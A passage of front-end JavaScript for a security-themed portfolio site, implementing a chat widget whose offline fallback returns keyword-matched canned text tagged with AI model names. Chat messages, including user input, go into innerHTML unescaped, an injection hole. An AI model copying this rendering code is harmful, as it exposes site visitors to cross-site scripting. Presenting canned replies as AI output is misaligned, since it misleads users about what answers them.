  { id: 'gemma4', name: 'Gemma 4', icon: '<i class="fas fa-shield-halved"></i>', color: '#00ff88', promptMod: 'Balanced, secure, and structured cybersecurity focus.' }
];

let selectedModel = 'deepseek-v4-flash:cloud';
let conversationHistory = [];
let floatConversationHistory = [];

function generateSmartAIResponse(query, modelId) {
  const q = query.toLowerCase();
  const model = AI_MODELS.find(m => m.id === modelId) || AI_MODELS[0];
  const tag = `[${model.name.toUpperCase()} // NEURAL CORE]`;

  if (q.includes('os') || q.includes('asterix-os') || q.includes('operating system') || q.includes('distro') || q.includes('kernel')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.asterixos}\n\nDirect Repositories:\n• GitHub: https://github.com/NEXO-TECHNOLOGIES/ASTERIX-OS.git\n• GitLab: https://gitlab.com/nexo-technologies-group/asterix-os.git\n\nExperience the live ASTERIX-OS Spotlight on index.html!`;
  }
  if (q.includes('who') || q.includes('about') || q.includes('nexo') || q.includes('what is') || q.includes('alexander') || q.includes('founder')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.identity}\n\nFlagship Centerpiece: ASTERIX-OS — The Custom Cyber Operating System & Hardened Kernel.\nKey Focus Areas: Low-level systems engineering (Rust/C++), enterprise full-stack development, and defensive cybersecurity auditing.`;
  }
  if (q.includes('wifi') || q.includes('wireless') || q.includes('aircrack') || q.includes('handshake') || q.includes('wpa')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.wifi}`;
  }
  if (q.includes('metasploit') || q.includes('meterpreter') || q.includes('msfvenom') || q.includes('payload') || q.includes('exploit')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.metasploit}`;
  }
  if (q.includes('wireshark') || q.includes('packet') || q.includes('sniff') || q.includes('pcap') || q.includes('tcpdump')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.wireshark}`;
  }
  if (q.includes('crypto') || q.includes('encrypt') || q.includes('aes') || q.includes('fernet') || q.includes('hash') || q.includes('sha')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.crypto}`;
  }
  if (q.includes('linux') || q.includes('kernel') || q.includes('harden') || q.includes('sysctl') || q.includes('ufw') || q.includes('firewall')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.linux}`;
  }
  if (q.includes('rust') || q.includes('cargo') || q.includes('tokio') || q.includes('memory safe')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.rust}`;
  }
  if (q.includes('python') || q.includes('scapy') || q.includes('fastapi') || q.includes('django')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.python}`;
  }
  if (q.includes('language') || q.includes('skill') || q.includes('stack') || q.includes('tech') || q.includes('languages') || q.includes('golang') || q.includes('c++')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.skills}`;
  }
  if (q.includes('service') || q.includes('price') || q.includes('cost') || q.includes('hire') || q.includes('web') || q.includes('app') || q.includes('package')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.services}\n\nDirect Inquiry: WhatsApp +234 704 4339 491 or Email demonalexander526@gmail.com.`;
  }
  if (q.includes('project') || q.includes('tool') || q.includes('bot') || q.includes('flooder') || q.includes('demonic') || q.includes('arsenal')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.projects}\n\nExplore live interactive simulators on /tools.html and R&D trackers on /lab.html.`;
  }
  if (q.includes('contact') || q.includes('whatsapp') || q.includes('email') || q.includes('telegram') || q.includes('reach')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.contact}`;
  }
  if (q.includes('hack') || q.includes('security') || q.includes('cyber') || q.includes('pentest')) {
    return `${tag}\n${NEXO_KNOWLEDGE_BASE.hacking}\n\nInspect our Global Attack Radar on /hacking.html and CTF Challenges on /learn-hacking.html.`;
  }
  if (q.includes('hello') || q.includes('hi') || q.includes('hey') || q.includes('greetings') || q.includes('yo')) {
    return `${tag}\nGreetings operator. NEXO-AI neural matrix is fully synced.\nAsk me anything about cybersecurity tools, penetration testing, systems programming (Rust/Python/C++), pricing packages, or custom bot architectures.`;
  }

  return `${tag}\nQuery processed: "${query}"\n\nNEXO-TECHNOLOGIES engineers military-grade digital architecture, automated red-team tooling, and polyglot software solutions.\n\nQuick Commands:\n• Ask about our Arsenal tools (DEMONIC-BOT, IP Flooder)\n• Ask about Penetration Testing (Metasploit, Wireshark, WPA2)\n• Ask about Programming Languages or Service Packages\n• Or open the Holographic Command Palette with [Ctrl+K]!`;
}

function initAIChat() {
  buildModelSelectors();
  
  window.sendChatMessage = sendChatMessage;
  window.sendFloatChatMessage = sendFloatChatMessage;
  window.sendQuickMessage = sendQuickMessage;
  window.handleChatKey = handleChatKey;
  window.handleFloatChatKey = handleFloatChatKey;
  window.toggleAiFloatPanel = toggleAiFloatPanel;
}

function buildModelSelectors() {
  const containers = [document.getElementById('modelSelector'), document.getElementById('floatModelSelector')];
  
  containers.forEach(container => {
    if (!container) return;
    container.innerHTML = '';
    
    AI_MODELS.forEach(model => {
      const tab = document.createElement('button');
      tab.className = `model-tab ${model.id === selectedModel ? 'active' : ''}`;
      tab.innerHTML = `
        <span>${model.icon}</span>
        <span>${model.name}</span>
        <div class="model-tab-dot" style="color:${model.color}"></div>
      `;
      
      tab.addEventListener('click', () => {
        selectedModel = model.id;
        buildModelSelectors();
      });
      
      container.appendChild(tab);
    });
  });
}

function handleChatKey(event) {
  if (event.key === 'Enter') sendChatMessage();
}

function handleFloatChatKey(event) {
  if (event.key === 'Enter') sendFloatChatMessage();
}

async function queryNeuralAI(text, modelId) {
  const model = AI_MODELS.find(m => m.id === modelId) || AI_MODELS[0];
  
  // 1. Attempt connection to Python AI backend (if running on localhost:8080)
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 800);
    
    const res = await fetch('http://localhost:8080/api/chat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: text, model: model.name }),
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      if (data.response || data.message) {
        return data.response || data.message;
      }
    }
  } catch (err) {
    // Python server offline or CORS/network timeout -> proceed to autonomous client-side neural core
  }
  
  // 2. Autonomous Neural Fallback (100% Reliable Client Execution)
  return generateSmartAIResponse(text, modelId);
}

async function sendChatMessage() {
  const input = document.getElementById('chatInput');
  const container = document.getElementById('chatMessages');
  if (!input || !container) return;
  
  const text = input.value.trim();
  if (!text) return;
  input.value = '';
  
  if (window.NexoAudio) window.NexoAudio.playLaser();
  addChatMessage(container, 'user', text);
  showTypingIndicator(container);
  
  const reply = await queryNeuralAI(text, selectedModel);
  
  setTimeout(() => {
    removeTypingIndicator(container);
    addChatMessage(container, 'ai', reply);
    if (window.NexoAudio) window.NexoAudio.playSuccess();
  }, 350 + Math.random() * 300);
}

async function sendFloatChatMessage() {
  const input = document.getElementById('floatChatInput');
  const container = document.getElementById('floatChatMessages');
  if (!input || !container) return;
  
  const text = input.value.trim();
  if (!text) return;
  input.value = '';
  
  if (window.NexoAudio) window.NexoAudio.playLaser();
  addChatMessage(container, 'user', text);
  showTypingIndicator(container);
  
  const reply = await queryNeuralAI(text, selectedModel);
  
  setTimeout(() => {
    removeTypingIndicator(container);
    addChatMessage(container, 'ai', reply);
    if (window.NexoAudio) window.NexoAudio.playSuccess();
  }, 300 + Math.random() * 250);
}

function sendQuickMessage(text) {
  const input = document.getElementById('chatInput');
  if (input) {
    input.value = text;
    sendChatMessage();
  }
}

function speakNexoAi(text) {
  if (!('speechSynthesis' in window)) return;
  window.speechSynthesis.cancel();
  const clean = text.replace(/\[.*?\]/g, '').replace(/[#*`_]/g, '');
  const utter = new SpeechSynthesisUtterance(clean);
  utter.rate = 1.05;
  utter.pitch = 0.85; // cyber pitch
  window.speechSynthesis.speak(utter);
}
window.speakNexoAi = speakNexoAi;

function copyNexoText(text, btn) {
  navigator.clipboard.writeText(text).then(() => {
    const orig = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-check"></i>';
    if (window.NexoAudio) window.NexoAudio.playSuccess();
    setTimeout(() => { btn.innerHTML = orig; }, 2000);
  });
}
window.copyNexoText = copyNexoText;

function addChatMessage(container, role, content) {
  const msgDiv = document.createElement('div');
  msgDiv.className = `chat-msg ${role === 'user' ? 'user' : 'ai'}`;
  
  const now = new Date();
  const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
  
  const avatarHtml = role === 'user'
    ? '<div class="msg-avatar" style="background:rgba(191,0,255,.15);border:1px solid rgba(191,0,255,.3);color:#bf00ff"><i class="fas fa-user"></i></div>'
    : '<div class="msg-avatar ai-msg-avatar" style="background:rgba(0,245,255,.15);border:1px solid rgba(0,245,255,.3);color:#00f5ff"><i class="fas fa-robot"></i></div>';
  
  const formattedContent = content.replace(/\n/g, '<br>');
  const escapedContent = content.replace(/'/g, "\\'").replace(/"/g, '&quot;');
  
  const actionsHtml = role === 'ai'
    ? `<div class="msg-actions" style="display:flex;gap:6px;margin-top:6px">
         <button class="msg-action-btn" onclick="copyNexoText('${escapedContent}', this)" title="Copy Text"><i class="fas fa-copy"></i></button>
         <button class="msg-action-btn" onclick="speakNexoAi('${escapedContent}')" title="Cyber Voice"><i class="fas fa-volume-up"></i></button>
       </div>`
    : '';

  msgDiv.innerHTML = `
    ${avatarHtml}
    <div class="msg-bubble">
      ${formattedContent}
      ${actionsHtml}
      <span class="msg-time">${timeStr} // NEXO_CORE</span>
    </div>
  `;
  
  container.appendChild(msgDiv);
  container.scrollTop = container.scrollHeight;
}

function showTypingIndicator(container) {
  removeTypingIndicator(container);
  const indicator = document.createElement('div');
  indicator.id = 'typing-indicator';
  indicator.className = 'typing-indicator';
  indicator.innerHTML = `
    <div class="typing-dot"></div>
    <div class="typing-dot"></div>
    <div class="typing-dot"></div>
  `;
  container.appendChild(indicator);
  container.scrollTop = container.scrollHeight;
}

function removeTypingIndicator(container) {
  const existing = container.querySelector('#typing-indicator');
  if (existing) existing.remove();
}

function toggleAiFloatPanel() {
  const panel = document.getElementById('ai-float-panel');
  if (panel) {
    panel.classList.toggle('active');
    if (panel.classList.contains('active')) {
      const input = document.getElementById('floatChatInput');
      if (input) setTimeout(() => input.focus(), 150);
    }
  }
}

// =========================================================
// 21. ADDITIONAL CYBER EFFECTS
// =========================================================
function initGlitchText() {
  const glitched = document.querySelectorAll('.glitch');
  if (glitched.length === 0) return;
  
  setInterval(() => {
    const el = glitched[Math.floor(Math.random() * glitched.length)];
    if (el) {
      el.classList.add('glitch-active');
      setTimeout(() => el.classList.remove('glitch-active'), 250);
    }
  }, 4000);
}

function initTerminalText() {
  const terminals = document.querySelectorAll('[data-terminal="true"]');
  terminals.forEach(term => {
    const text = term.getAttribute('data-text') || term.textContent;
    term.textContent = '';
    let i = 0;
    
    function typeTerm() {
      if (i < text.length) {
        term.textContent += text.charAt(i);
        i++;
        setTimeout(typeTerm, Math.random() * 35 + 15);
      }
    }
    
    const observer = new IntersectionObserver((entries) => {
      if (entries[0].isIntersecting) {
        typeTerm();
        observer.disconnect();
      }
    }, { threshold: 0.2 });
    observer.observe(term);
  });
}

function initHexGrid() {
  const canvas = document.getElementById('hex-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  
  canvas.width = canvas.offsetWidth;
  canvas.height = canvas.offsetHeight;
  
  const a = 20;
  function drawHexagon(x, y, opacity) {
    ctx.beginPath();
    for (let i = 0; i < 6; i++) {
      const angle = (Math.PI / 3) * i;
      const px = x + a * Math.cos(angle);
      const py = y + a * Math.sin(angle);
      if (i === 0) ctx.moveTo(px, py);
      else ctx.lineTo(px, py);
    }
    ctx.closePath();
    ctx.strokeStyle = `rgba(0, 255, 136, ${opacity})`;
    ctx.stroke();
  }
  
  let offset = 0;
  function animateHex() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    const w = canvas.width;
    const h = canvas.height;
    const dx = a * 1.5;
    const dy = a * Math.sqrt(3);
    
    for (let y = 0; y < h / dy + 2; y++) {
      for (let x = 0; x < w / dx + 2; x++) {
        const px = x * dx;
        const py = y * dy + (x % 2 === 1 ? dy / 2 : 0);
        const wave = Math.sin((px + py + offset) * 0.01) * 0.5 + 0.5;
        drawHexagon(px, py, wave * 0.18);
      }
    }
    offset += 1.5;
    requestAnimationFrame(animateHex);
  }
  animateHex();
}

function initScanLine() {
  const hero = document.querySelector('.hero');
  if (!hero) return;
}

// =========================================================
// 22. PAGE SPECIFIC INITIALIZERS
// =========================================================
function initHackingPage() {
  const cards = document.querySelectorAll('.security-category, .tool-card');
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
      }
    });
  }, { threshold: 0.15 });
  
  cards.forEach(c => observer.observe(c));
}

function initLearnPage() {
  const boxes = document.querySelectorAll('.topic-section, .package-card');
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
      }
    });
  }, { threshold: 0.15 });
  
  boxes.forEach(b => observer.observe(b));
}

function initProgrammingPage() {
  const prism = document.querySelector('.language-polygon-prism');
  if (!prism || isTouchDevice) return;
  
  document.addEventListener('mousemove', (e) => {
    const x = (e.clientX / window.innerWidth - 0.5) * 25;
    const y = (e.clientY / window.innerHeight - 0.5) * 25;
    prism.style.transform = `rotateX(${15 - y}deg) rotateY(${x}deg)`;
  });
}
